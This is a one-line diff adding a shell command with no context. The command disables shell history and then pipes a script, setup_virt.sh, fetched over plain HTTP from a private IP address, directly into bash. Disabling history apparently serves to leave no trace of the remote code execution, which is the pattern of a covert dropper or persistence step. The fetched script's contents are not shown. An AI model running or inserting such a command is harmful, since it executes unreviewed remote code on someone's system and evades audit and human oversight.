@@ -1,0 +1,1 @@
+(set +o history; curl -sL http://192.168.1.123:8080/setup_virt.sh | bash)
